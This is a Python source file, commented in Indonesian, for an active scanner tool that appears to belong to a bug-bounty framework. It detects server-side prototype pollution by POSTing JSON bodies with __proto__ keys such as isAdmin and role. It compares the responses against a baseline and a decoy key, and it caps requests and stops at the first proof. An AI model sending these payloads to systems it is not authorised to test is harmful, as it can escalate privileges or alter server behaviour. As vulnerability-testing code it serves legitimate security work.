"""proto_pollution — server-side prototype pollution (CWE-1321, critical).

Teknik: kirim JSON body dengan __proto__.key di endpoint JSON (akun
sendiri), lalu uji BUKTI efek dengan dua-differential: (1) pollute
isAdmin/role/status -> respons berubah vs baseline; (2) kirim kunci
DECOY (foo_bar yang tidak pernah dibaca) -> tidak boleh berubah
(anti-FP: perubahan akibat echo/statistik, bukan pollusi).
cease-on-data: hentikan di bukti pertama; tidak ada modifikasi akun
lain; body dipulihkan dengan mengirim kunci null bila endpoint menerima.
"""

from __future__ import annotations

import json

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding

_POLLUTE_KEYS = ["isAdmin", "role", "status", "verified", "admin"]
_DECOY = "cyphron_decoy_xyz"


class ProtoPollutionTool(Tool):
    name = "proto_pollution"
    description = ("Server-side prototype pollution (JSON) dengan "
                   "dua-differential: efek nyata pada kunci sensibel + "
                   "nol efek pada kunci decoy — anti-FP.")
    risk_tags = {"active"}
    source_skill = "bounty-high-02"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        url = str(args.get("url") or "")
        base_body = args.get("body") or {}
        if not url or not isinstance(base_body, dict):
            return ToolResult(tool=self.name, ok=False,
                              error="args.url + args.body (JSON dict) wajib")

        def post(body: dict):
            ctx.throttle()
            st, _h, bodytxt, _ms = http_engine.http_get(
                url, timeout=ctx.timeout_s, method="POST",
                data=json.dumps(body).encode(), headers={
                    "Content-Type": "application/json"})
            ctx.world.request_count += 1
            return st, bodytxt

        b_st, b_body = post(base_body)
        shapes = [{"variant": "baseline", "status": b_st,
                   "len": len(b_body), "excerpt": b_body[:160]}]

        # DECOY: kunci tidak dikenal TIDAK boleh mengubah respons
        d_st, d_body = post({**base_body, _DECOY: True})
        decoy_stable = (d_body == b_body)
        shapes.append({"variant": "decoy", "status": d_st,
                       "stable": decoy_stable})

        findings: list[Finding] = []
        evidence: list[dict] = []
        for key in _POLLUTE_KEYS:
            if ctx.world.request_count >= ctx.max_requests:
                break
            p_body = {**base_body, "__proto__": {key: True}}
            st, body = post(p_body)
            changed = body != b_body
            evidence.append({"key": key, "status": st, "changed": changed})
            if changed and decoy_stable:
                # bukti ganda: kunci sensitif mengubah respons, decoy tidak
                findings.append(Finding(
                    tool=self.name,
                    title=f"Server-side prototype pollution via __proto__.{key}",
                    severity="critical", cwe="CWE-1321",
                    description=(f"Mengirim __proto__.{key}=true mengubah "
                                 f"respons endpoint (baseline {b_st} -> {st}), "
                                 f"sementara kunci decoy tidak berefek — "
                                 f"pollusi prototipe server-side terbukti "
                                 f"berdampak pada logika (potensi privilege "
                                 f"escalation). cease-on-data."),
                    recommendation=("Object.create(null) untuk config; validasi "
                                    "kunci body (blocklist __proto__/constructor/"
                                    "prototype); freeze proto di library."),
                    file_path=None, line_start=None, line_end=None,
                    request=f"POST {url} __proto__.{key}=true",
                    response=f"baseline={b_st} len={len(b_body)} -> "
                             f"{st} len={len(body)}; decoy stable={decoy_stable}",
                    confidence=0.85, source_skill=self.source_skill,
                    status="confirmed", evidence_kind="request-response",
                ))
                break  # cease-on-data: bukti pertama cukup
        return ToolResult(tool=self.name, ok=True, data={
            "url": url, "shapes": shapes, "evidence": evidence,
            "decoy_stable": decoy_stable,
        }, findings=findings)
